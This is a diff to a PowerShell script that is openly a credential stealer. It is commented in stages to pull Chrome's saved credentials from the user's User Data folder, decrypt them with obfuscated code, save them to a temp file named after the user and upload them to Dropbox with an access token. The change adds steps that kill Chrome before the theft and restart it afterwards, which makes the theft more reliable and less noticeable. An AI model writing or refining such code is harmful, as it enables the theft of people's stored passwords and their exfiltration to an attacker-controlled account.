@@ -25,6 +25,10 @@ $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #Stage 1 Obtain the credentials from the Chrome browsers User Data folder
+
+#First we Kill Chrome just to be safe
+Stop-Process -Name Chrome
+
 $d=Add-Type -A System.Security
 $p='public static'
 $g=""")]$p extern"
@@ -47,6 +51,11 @@ $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_
 #After Decrypting the contents of the files, save them to a file in the temp folder.
 
 echo $l >> $env:TMP\$FileName
+
+#Start Chrome again
+
+$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
+Start-Process -FilePath $pathToChrome
 
 #Stage 2 Upload them to Dropbox
 
